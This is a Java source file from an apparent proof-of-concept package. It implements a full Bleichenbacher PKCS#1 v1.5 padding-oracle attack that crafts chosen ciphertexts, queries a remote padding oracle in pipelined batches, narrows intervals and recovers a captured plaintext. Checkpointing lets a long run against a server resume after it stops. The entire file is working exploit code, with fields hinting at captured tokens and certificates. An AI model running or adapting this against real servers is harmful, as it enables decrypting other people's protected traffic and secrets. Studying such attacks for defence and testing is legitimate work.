package poc.common;

import java.math.BigInteger;
import java.util.ArrayList;
import java.util.List;
import java.util.Properties;
import java.util.StringJoiner;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * Classical Bleichenbacher PKCS#1 v1.5 chosen-ciphertext interval-narrowing (RFC 8017-grounded),
 * driven entirely by a caller-supplied {@link Oracle} -- this class never touches a private key
 * and never decrypts anything locally; it only crafts {@code c' = c0 * s^e mod n} candidates and
 * asks the oracle whether the server reports them as PKCS#1-conforming.
 *
 * <p>Resumable: {@link #recover} takes a {@link Checkpoint} that is mutated in place and can be
 * persisted (see {@link Checkpoint#toProperties()} / {@link Checkpoint#fromProperties}) after
 * every invocation, so a run bounded by {@code maxQueries}/{@code maxRuntimeMillis} that does not
 * finish can be resumed later from exactly where it left off instead of restarting the search.
 */
public final class BleichenbacherEngine {

  private static final Logger LOGGER = LoggerFactory.getLogger(BleichenbacherEngine.class);

  /** A single padding-validity query batch, answered only by real remote responses. */
  public interface Oracle {
    /** Returns conforming[i] for ciphertexts[i], aligned. May pipeline internally. */
    boolean[] batchConforming(byte[][] ciphertexts) throws Exception;
  }

  public enum Phase {
    STEP2A,
    NARROWING,
    COMPLETE
  }

  /** Mutable, (de)serializable search state -- this is exactly what gets checkpointed. */
  public static final class Checkpoint {
    public Phase phase = Phase.STEP2A;
    public BigInteger cursorS; // next s to try, STEP2A
    public BigInteger lastS; // most recent conforming s, NARROWING
    public List<BigInteger[]> intervals = new ArrayList<>();
    public long queryCount = 0;
    public double elapsedSeconds = 0;
    public int iteration = 0;
    public BigInteger plaintext; // set once phase == COMPLETE
    public String certFingerprint;
    public String tokenHash;

    public Properties toProperties() {
      Properties p = new Properties();
      p.setProperty("phase", phase.name());
      if (cursorS != null) p.setProperty("cursorS", cursorS.toString());
      if (lastS != null) p.setProperty("lastS", lastS.toString());
      StringJoiner sj = new StringJoiner(",");
      for (BigInteger[] iv : intervals) {
        sj.add(iv[0].toString() + ":" + iv[1].toString());
      }
      p.setProperty("intervals", sj.toString());
      p.setProperty("queryCount", Long.toString(queryCount));
      p.setProperty("elapsedSeconds", Double.toString(elapsedSeconds));
      p.setProperty("iteration", Integer.toString(iteration));
      if (plaintext != null) p.setProperty("plaintext", plaintext.toString());
      if (certFingerprint != null) p.setProperty("certFingerprint", certFingerprint);
      if (tokenHash != null) p.setProperty("tokenHash", tokenHash);
      return p;
    }

    public static Checkpoint fromProperties(Properties p) {
      Checkpoint c = new Checkpoint();
      c.phase = Phase.valueOf(p.getProperty("phase", "STEP2A"));
      String cursorS = p.getProperty("cursorS");
      if (cursorS != null && !cursorS.isEmpty()) c.cursorS = new BigInteger(cursorS);
      String lastS = p.getProperty("lastS");
      if (lastS != null && !lastS.isEmpty()) c.lastS = new BigInteger(lastS);
      String intervals = p.getProperty("intervals", "");
      c.intervals = new ArrayList<>();
      if (!intervals.isEmpty()) {
        for (String pair : intervals.split(",")) {
          String[] ab = pair.split(":");
          c.intervals.add(new BigInteger[] {new BigInteger(ab[0]), new BigInteger(ab[1])});
        }
      }
      c.queryCount = Long.parseLong(p.getProperty("queryCount", "0"));
      c.elapsedSeconds = Double.parseDouble(p.getProperty("elapsedSeconds", "0"));
      c.iteration = Integer.parseInt(p.getProperty("iteration", "0"));
      String plaintext = p.getProperty("plaintext");
      if (plaintext != null && !plaintext.isEmpty()) c.plaintext = new BigInteger(plaintext);
      c.certFingerprint = p.getProperty("certFingerprint");
      c.tokenHash = p.getProperty("tokenHash");
      return c;
    }
  }

  public static final class Result {
    public boolean complete;
    public BigInteger plaintext;
    public long queriesThisInvocation;
    public double secondsThisInvocation;
    public long totalQueries;
    public int remainingWidthBits = -1;
  }

  /** Checkpoint-write callback, invoked periodically during a long search so progress survives a kill -9. */
  public interface CheckpointSink {
    void save(Checkpoint checkpoint);
  }

  private final BigInteger n;
  private final BigInteger e;
  private final int k;
  private final int window;
  private final Oracle oracle;
  private final BigInteger bigB;
  private final BigInteger twoB;
  private final BigInteger threeB;
  private final BigInteger threeBMinusOne;
  private final long maxQueries; // 0 = unlimited
  private final long deadlineNanos;
  private final CheckpointSink checkpointSink;
  private final long checkpointEveryQueries;

  private BigInteger c0;
  private long queriesThisInvocation = 0;
  private long checkpointAtQuery = 0;

  public BleichenbacherEngine(
      BigInteger n,
      BigInteger e,
      int k,
      int window,
      Oracle oracle,
      long maxQueries,
      long maxRuntimeMillis,
      CheckpointSink checkpointSink,
      long checkpointEveryQueries) {
    this.n = n;
    this.e = e;
    this.k = k;
    this.window = window;
    this.oracle = oracle;
    this.bigB = BigInteger.TWO.pow(8 * (k - 2));
    this.twoB = bigB.multiply(BigInteger.TWO);
    this.threeB = bigB.multiply(BigInteger.valueOf(3));
    this.threeBMinusOne = threeB.subtract(BigInteger.ONE);
    this.maxQueries = maxQueries;
    this.deadlineNanos = System.nanoTime() + maxRuntimeMillis * 1_000_000L;
    this.checkpointSink = checkpointSink;
    this.checkpointEveryQueries = checkpointEveryQueries;
  }

  private byte[] craft(BigInteger s) {
    BigInteger cPrime = c0.multiply(s.modPow(e, n)).mod(n);
    return WireCodec.i2osp(cPrime, k);
  }

  private boolean budgetExhausted(Checkpoint cp) {
    if (maxQueries > 0 && (cp.queryCount + queriesThisInvocation) >= maxQueries) {
      return true;
    }
    return System.nanoTime() >= deadlineNanos;
  }

  private BigInteger smallestConformingFrom(BigInteger start, Checkpoint cp, long t0) throws Exception {
    BigInteger s = start;
    while (true) {
      if (budgetExhausted(cp)) {
        cp.cursorS = s;
        return null;
      }
      byte[][] cts = new byte[window][];
      BigInteger[] cand = new BigInteger[window];
      BigInteger cur = s;
      for (int i = 0; i < window; i++) {
        cand[i] = cur;
        cts[i] = craft(cur);
        cur = cur.add(BigInteger.ONE);
      }
      boolean[] res = oracle.batchConforming(cts);
      queriesThisInvocation += window;
      maybeCheckpoint(cp, t0);
      for (int i = 0; i < window; i++) {
        if (res[i]) {
          return cand[i];
        }
      }
      s = cur;
      cp.cursorS = s;
    }
  }

  private BigInteger firstConformingInRange(BigInteger lo, BigInteger hi, Checkpoint cp, long t0) throws Exception {
    BigInteger s = lo;
    while (s.compareTo(hi) <= 0) {
      if (budgetExhausted(cp)) {
        return null;
      }
      long span = hi.subtract(s).add(BigInteger.ONE).min(BigInteger.valueOf(window)).longValue();
      int w = (int) span;
      byte[][] cts = new byte[w][];
      BigInteger[] cand = new BigInteger[w];
      BigInteger cur = s;
      for (int i = 0; i < w; i++) {
        cand[i] = cur;
        cts[i] = craft(cur);
        cur = cur.add(BigInteger.ONE);
      }
      boolean[] res = oracle.batchConforming(cts);
      queriesThisInvocation += w;
      maybeCheckpoint(cp, t0);
      for (int i = 0; i < w; i++) {
        if (res[i]) {
          return cand[i];
        }
      }
      s = cur;
    }
    return null;
  }

  private void maybeCheckpoint(Checkpoint cp, long t0) {
    if (checkpointSink == null) return;
    if (queriesThisInvocation - checkpointAtQuery >= checkpointEveryQueries) {
      checkpointAtQuery = queriesThisInvocation;
      Checkpoint snapshot = snapshot(cp, t0);
      checkpointSink.save(snapshot);
    }
  }

  private Checkpoint snapshot(Checkpoint cp, long t0) {
    Checkpoint s = new Checkpoint();
    s.phase = cp.phase;
    s.cursorS = cp.cursorS;
    s.lastS = cp.lastS;
    s.intervals = cp.intervals;
    s.queryCount = cp.queryCount + queriesThisInvocation;
    s.elapsedSeconds = cp.elapsedSeconds + (System.nanoTime() - t0) / 1e9;
    s.iteration = cp.iteration;
    s.plaintext = cp.plaintext;
    s.certFingerprint = cp.certFingerprint;
    s.tokenHash = cp.tokenHash;
    return s;
  }

  /**
   * Runs (or resumes) the search against {@code capturedC0}, bounded by this invocation's
   * maxQueries/maxRuntime. {@code checkpoint} is read for resume state and mutated in place to
   * reflect the final state (whether complete or budget-exhausted).
   */
  public Result recover(BigInteger capturedC0, Checkpoint checkpoint) throws Exception {
    this.c0 = capturedC0;
    long t0 = System.nanoTime();
    queriesThisInvocation = 0;
    checkpointAtQuery = 0;

    Result result = new Result();

    if (checkpoint.phase == Phase.COMPLETE && checkpoint.plaintext != null) {
      result.complete = true;
      result.plaintext = checkpoint.plaintext;
      result.totalQueries = checkpoint.queryCount;
      return result;
    }

    List<BigInteger[]> intervals = checkpoint.intervals;
    BigInteger s;

    if (checkpoint.phase == Phase.STEP2A) {
      BigInteger sStart =
          checkpoint.cursorS != null ? checkpoint.cursorS : ceilDiv(n, threeB);
      if (intervals.isEmpty()) {
        intervals = new ArrayList<>();
        intervals.add(new BigInteger[] {twoB, threeBMinusOne});
      }
      LOGGER.info(
          "Step 2a: searching first conforming s >= {} (pipelined, window={})", sStart, window);
      s = smallestConformingFrom(sStart, checkpoint, t0);
      if (s == null) {
        return incomplete(result, checkpoint, intervals, t0, Phase.STEP2A);
      }
      LOGGER.info(
          "Step 2a: first conforming s found after {} queries (this invocation)",
          queriesThisInvocation);
      checkpoint.phase = Phase.NARROWING;
      checkpoint.lastS = s;
    } else {
      s = checkpoint.lastS;
    }

    int iteration = checkpoint.iteration;
    long lastLog = 0;
    while (true) {
      iteration++;
      intervals = narrowIntervals(intervals, s, n, twoB, threeBMinusOne);

      if (intervals.isEmpty()) {
        throw new IllegalStateException("interval set collapsed to empty -- oracle inconsistency");
      }

      if (intervals.size() == 1) {
        BigInteger a = intervals.get(0)[0];
        BigInteger b = intervals.get(0)[1];
        long widthBits = b.subtract(a).bitLength();
        if (queriesThisInvocation - lastLog >= 2000 || widthBits < 32) {
          LOGGER.info(
              "  iter {}: 1 interval, width 2^{} ({} queries this invocation)",
              iteration,
              widthBits,
              queriesThisInvocation);
          lastLog = queriesThisInvocation;
        }
        if (a.equals(b)) {
          result.complete = true;
          result.plaintext = a;
          checkpoint.phase = Phase.COMPLETE;
          checkpoint.plaintext = a;
          checkpoint.intervals = intervals;
          checkpoint.iteration = iteration;
          checkpoint.queryCount += queriesThisInvocation;
          checkpoint.elapsedSeconds += (System.nanoTime() - t0) / 1e9;
          result.queriesThisInvocation = queriesThisInvocation;
          result.secondsThisInvocation = (System.nanoTime() - t0) / 1e9;
          result.totalQueries = checkpoint.queryCount;
          return result;
        }
      }

      checkpoint.intervals = intervals;
      checkpoint.iteration = iteration;
      checkpoint.lastS = s;

      if (budgetExhausted(checkpoint)) {
        return incomplete(result, checkpoint, intervals, t0, Phase.NARROWING);
      }

      if (intervals.size() > 1) {
        s = smallestConformingFrom(s.add(BigInteger.ONE), checkpoint, t0);
        if (s == null) {
          checkpoint.intervals = intervals;
          checkpoint.iteration = iteration;
          return incomplete(result, checkpoint, intervals, t0, Phase.NARROWING);
        }
      } else {
        BigInteger a = intervals.get(0)[0];
        BigInteger b = intervals.get(0)[1];
        s = step2c(a, b, s, checkpoint, t0);
        if (s == null) {
          checkpoint.intervals = intervals;
          checkpoint.iteration = iteration;
          return incomplete(result, checkpoint, intervals, t0, Phase.NARROWING);
        }
      }
    }
  }

  private Result incomplete(
      Result r, Checkpoint cp, List<BigInteger[]> intervals, long t0, Phase phase) {
    r.complete = false;
    cp.phase = phase;
    cp.intervals = intervals;
    cp.queryCount += queriesThisInvocation;
    cp.elapsedSeconds += (System.nanoTime() - t0) / 1e9;
    r.queriesThisInvocation = queriesThisInvocation;
    r.secondsThisInvocation = (System.nanoTime() - t0) / 1e9;
    r.totalQueries = cp.queryCount;
    BigInteger minWidth = null;
    for (BigInteger[] iv : intervals) {
      BigInteger w = iv[1].subtract(iv[0]);
      if (minWidth == null || w.compareTo(minWidth) < 0) {
        minWidth = w;
      }
    }
    r.remainingWidthBits = minWidth == null ? -1 : minWidth.bitLength();
    return r;
  }

  private BigInteger step2c(BigInteger a, BigInteger b, BigInteger sPrev, Checkpoint cp, long t0)
      throws Exception {
    BigInteger r = ceilDiv(b.multiply(sPrev).subtract(twoB).multiply(BigInteger.TWO), n);
    while (true) {
      if (budgetExhausted(cp)) {
        return null;
      }
      BigInteger rN = r.multiply(n);
      BigInteger sLow = ceilDiv(twoB.add(rN), b);
      BigInteger sHigh = threeBMinusOne.add(rN).divide(a);
      BigInteger found = firstConformingInRange(sLow, sHigh, cp, t0);
      if (found != null) {
        return found;
      }
      if (budgetExhausted(cp)) {
        return null;
      }
      r = r.add(BigInteger.ONE);
    }
  }

  private static BigInteger ceilDiv(BigInteger a, BigInteger b) {
    BigInteger[] qr = a.divideAndRemainder(b);
    if (qr[1].signum() > 0) {
      return qr[0].add(BigInteger.ONE);
    }
    return qr[0];
  }

  private static List<BigInteger[]> narrowIntervals(
      List<BigInteger[]> oldIntervals,
      BigInteger s,
      BigInteger n,
      BigInteger twoB,
      BigInteger threeBMinusOne) {

    List<BigInteger[]> newIntervals = new ArrayList<>();
    for (BigInteger[] interval : oldIntervals) {
      BigInteger a = interval[0];
      BigInteger b = interval[1];
      BigInteger rLow = ceilDiv(a.multiply(s).subtract(threeBMinusOne), n);
      BigInteger rHigh = b.multiply(s).subtract(twoB).divide(n);
      for (BigInteger r = rLow; r.compareTo(rHigh) <= 0; r = r.add(BigInteger.ONE)) {
        BigInteger rN = r.multiply(n);
        BigInteger newA = a.max(ceilDiv(twoB.add(rN), s));
        BigInteger newB = b.min(threeBMinusOne.add(rN).divide(s));
        if (newA.compareTo(newB) <= 0) {
          boolean merged = false;
          for (BigInteger[] existing : newIntervals) {
            if (newA.compareTo(existing[1]) <= 0 && existing[0].compareTo(newB) <= 0) {
              existing[0] = existing[0].min(newA);
              existing[1] = existing[1].max(newB);
              merged = true;
              break;
            }
          }
          if (!merged) {
            newIntervals.add(new BigInteger[] {newA, newB});
          }
        }
      }
    }
    return newIntervals;
  }
}
